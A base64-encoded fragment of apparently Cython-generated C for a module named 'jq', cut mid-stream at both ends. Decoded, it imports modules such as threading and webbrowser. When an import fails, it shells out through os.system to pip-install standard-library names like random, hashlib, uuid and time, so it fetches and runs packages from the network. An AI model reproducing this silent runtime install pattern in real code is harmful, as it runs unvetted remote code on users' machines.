wgX19weXhfTDc0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZywgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDUyLCBfX3B5eF9MNzRfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dlYmJyb3dzZXIsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA1MywgX19weXhfTDc0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dlYmJyb3dzZXIsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCA1MywgX19weXhfTDc0X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0w3OV90cnlfZW5kO1xuICAgIF9fcHl4X0w3NF9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImpxIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzIsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDU0LCBfX3B5eF9MNzZfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA1NSwgX19weXhfTDc2X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNTUsIF9fcHl4X0w3Nl9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9yYW5kb219O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MNzZfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgZ290byBfX3B5eF9MNzVfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDc2X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MNzVfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIF9fcHl4X0w3OV90cnlfZW5kOjtcbiAgfVxuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzcsICZfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA1NywgX19weXhfTDgyX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDU3LCBfX3B5eF9MODJfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIGdvdG8gX19weXhfTDg3X3RyeV9lbmQ7XG4gICAgX19weXhfTDgyX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygianEiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMywgJl9fcHl4X3RfMiwgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgNTgsIF9fcHl4X0w4NF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNTksIF9fcHl4X0w4NF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA1OSwgX19weXhfTDg0X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfaGFzaGxpYn07XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA1OSwgX19weXhfTDg0X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDgzX2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0w4NF9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDgzX2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBfX3B5eF9MODdfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF84LCAmX19weXhfdF83LCAmX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGFzaGxpYiwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MOTBfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGFzaGxpYiwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MOTBfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIGdvdG8gX19weXhfTDk1X3RyeV9lbmQ7XG4gICAgX19weXhfTDkwX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygianEiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMykgPCAwKSBfX1BZWF9FUlIoMCwgNjIsIF9fcHl4X0w5Ml9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA2MywgX19weXhfTDkyX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDYzLCBfX3B5eF9MOTJfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfdXVpZH07XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA2MywgX19weXhfTDkyX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDkxX2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0w5Ml9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDkxX2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBfX3B5eF9MOTVfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF83LCAmX19weXhfdF84KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDY1LCBfX3B5eF9MOThfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDY1LCBfX3B5eF9MOThfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIGdvdG8gX19weXhfTDEwM190cnlfZW5kO1xuICAgIF9fcHl4X0w5OF9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImpxIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzMsICZfX3B5eF90XzIsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDY2LCBfX3B5eF9MMTAwX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzkgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wxMDBfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA2NywgX19weXhfTDEwMF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF90aW1lfTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA2NywgX19weXhfTDEwMF9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w5OV9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MMTAwX2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICA